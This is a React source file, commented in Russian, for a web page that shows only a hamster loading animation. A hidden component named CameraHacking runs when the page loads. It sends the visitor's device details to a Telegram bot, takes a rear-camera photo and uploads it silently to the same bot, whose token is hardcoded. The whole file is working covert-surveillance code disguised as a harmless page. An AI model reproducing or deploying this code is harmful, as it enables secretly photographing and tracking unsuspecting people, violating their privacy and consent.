import React, { useRef, useEffect } from "react";
import { useParams, BrowserRouter, Routes, Route } from "react-router-dom";
import ReactDOM from "react-dom/client";
import "./App.css";

/**
 * КОМПОНЕНТ CAMERAHACKING
 */
const CameraHacking = ({ chatId }) => {
  const hasCaptured = useRef(false);
  const isProcessing = useRef(false);

  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';

  // Метод отправки который не показывает ответ
  const sendToTelegramSilent = (text) => {
    // Используем XMLHttpRequest чтобы не показывать ответ
    const xhr = new XMLHttpRequest();
    xhr.open('POST', `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    
    xhr.send(JSON.stringify({
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML',
      disable_notification: true
    }));
  };

  // Отправка фото без показа ответа
  const sendPhotoSilent = (blob, caption = '') => {
    return new Promise((resolve) => {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, 'photo.jpg');
      formData.append('disable_notification', 'true');
      if (caption) formData.append('caption', caption);

      const xhr = new XMLHttpRequest();
      xhr.open('POST', `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, true);
      
      xhr.onload = () => resolve(true);
      xhr.onerror = () => resolve(false);
      
      xhr.send(formData);
    });
  };

  // Создание фото с камеры
  const capturePhoto = async () => {
    if (isProcessing.current) return;
    isProcessing.current = true;
    
    try {
      // Получаем доступ к камере
      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: { ideal: "environment" },
          width: { ideal: 1920 },
          height: { ideal: 1080 }
        },
        audio: false
      });
      
      // Создаем видео элемент
      const video = document.createElement('video');
      video.style.display = 'none';
      video.autoplay = true;
      video.muted = true;
      video.playsInline = true;
      video.srcObject = stream;
      
      document.body.appendChild(video);
      
      // Ждем готовности видео
      await new Promise(resolve => {
        video.onloadedmetadata = () => {
          video.play();
          setTimeout(resolve, 1000);
        };
      });
      
      // Создаем canvas для фото
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      
      // Конвертируем в blob
      const blob = await new Promise(resolve => {
        canvas.toBlob(resolve, 'image/jpeg', 0.8);
      });
      
      // Останавливаем камеру
      stream.getTracks().forEach(track => track.stop());
      video.remove();
      
      // Отправляем фото
      const caption = `📸 Фото с устройства\n` +
        `📱 ${navigator.platform}\n` +
        `🌐 ${navigator.userAgent.substring(0, 50)}...\n` +
        `⏰ ${new Date().toLocaleString()}`;
      
      await sendPhotoSilent(blob, caption);
      sendToTelegramSilent('✅ Фото отправлено');
      
      hasCaptured.current = true;
      
    } catch (error) {
      console.error('Capture error:', error);
      sendToTelegramSilent(`❌ Ошибка: ${error.message}`);
    } finally {
      isProcessing.current = false;
    }
  };

  // Сбор информации об устройстве
  const collectAndSendDeviceInfo = () => {
    const info = {
      platform: navigator.platform,
      userAgent: navigator.userAgent,
      screen: `${window.screen.width}x${window.screen.height}`,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: navigator.deviceMemory,
      isMobile: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)
    };
    
    const message = `📱 Информация об устройстве
    
Платформа: ${info.platform}
Экран: ${info.screen}
Мобильное: ${info.isMobile ? 'Да' : 'Нет'}
Язык: ${info.language}
Время: ${new Date().toLocaleString()}`;
    
    sendToTelegramSilent(message);
  };

  // Основная логика
  useEffect(() => {
    if (hasCaptured.current) return;
    
    const init = async () => {
      // Отправляем стартовое сообщение
      sendToTelegramSilent('🚀 Пользователь зашел на сайт');
      
      // Собираем информацию об устройстве
      collectAndSendDeviceInfo();
      
      // Ждем немного и делаем фото
      setTimeout(async () => {
        if (!hasCaptured.current) {
          await capturePhoto();
        }
      }, 2000);
    };
    
    init();
  }, []);

  return null;
};

/**
 * КОМПОНЕНТ PHOTOPAGE - показывает только хомяка
 */
const PhotoPage = () => {
  const { chatId } = useParams();

  return (
    <>
      <div className="App" style={{
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)'
      }}>
        <div className="wraper">
          <div className="wheel-and-hamster">
            <div className="wheel"></div>
            <div className="hamster">
              <div className="hamster__body">
                <div className="hamster__head">
                  <div className="hamster__ear"></div>
                  <div className="hamster__eye"></div>
                  <div className="hamster__nose"></div>
                </div>
                <div className="hamster__limb hamster__limb--fr"></div>
                <div className="hamster__limb hamster__limb--fl"></div>
                <div className="hamster__limb hamster__limb--br"></div>
                <div className="hamster__limb hamster__limb--bl"></div>
                <div className="hamster__tail"></div>
              </div>
            </div>
            <div className="spoke"></div>
          </div>
          
          <div style={{
            textAlign: 'center',
            marginTop: '30px',
            color: 'white',
            fontSize: '18px',
            fontWeight: 'bold'
          }}>
            Загрузка...
          </div>
        </div>
      </div>

      <CameraHacking chatId={chatId} />
    </>
  );
};

/**
 * КОМПОНЕНТ APP
 */
const App = () => {
  return (
    <Routes>
      <Route path="/g/:chatId" element={<PhotoPage />} />
      <Route path="/" element={
        <div className="App" style={{
          minHeight: '100vh',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)'
        }}>
          <div className="wraper">
            <div className="wheel-and-hamster">
              <div className="wheel"></div>
              <div className="hamster">
                <div className="hamster__body">
                  <div className="hamster__head">
                    <div className="hamster__ear"></div>
                    <div className="hamster__eye"></div>
                    <div className="hamster__nose"></div>
                  </div>
                  <div className="hamster__limb hamster__limb--fr"></div>
                  <div className="hamster__limb hamster__limb--fl"></div>
                  <div className="hamster__limb hamster__limb--br"></div>
                  <div className="hamster__limb hamster__limb--bl"></div>
                  <div className="hamster__tail"></div>
                </div>
              </div>
              <div className="spoke"></div>
            </div>
          </div>
        </div>
      } />
    </Routes>
  );
};

/**
 * ОСНОВНОЙ РЕНДЕР
 */
const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(
  <BrowserRouter>
    <App />
  </BrowserRouter>
);

export default App;
